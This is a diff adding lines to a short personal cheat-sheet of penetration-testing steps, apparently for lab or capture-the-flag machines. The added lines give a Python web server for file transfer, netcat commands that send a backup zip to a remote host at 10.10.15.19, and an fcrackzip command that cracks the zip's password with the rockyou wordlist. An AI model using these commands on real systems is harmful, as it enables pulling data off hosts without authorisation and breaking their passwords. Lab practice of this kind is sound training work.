@@ -1,5 +1,4 @@
 Enumeration-Foothold-Privelege Escalation
-
 --------------------------------------------------------------------
 https://www.explainshell.com/ - Useful for Checking what shell commands mean
 -------------------------------------------------------------------------------
@@ -27,3 +26,12 @@ then nmap these ports
 sudo -l
 see what commands you can running
 ---------------------------------------------
+ python -m SimpleHTTPServer 8080
+--------------------------------------
+To recieve
+nc -l -p 3333 >16162020_backup.zip
+To send
+nc -w 3 10.10.15.19 3333 < 16162020_backup.zip
+------------------------------------------
+fcrackzip -D -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip
+-----------------------------------------
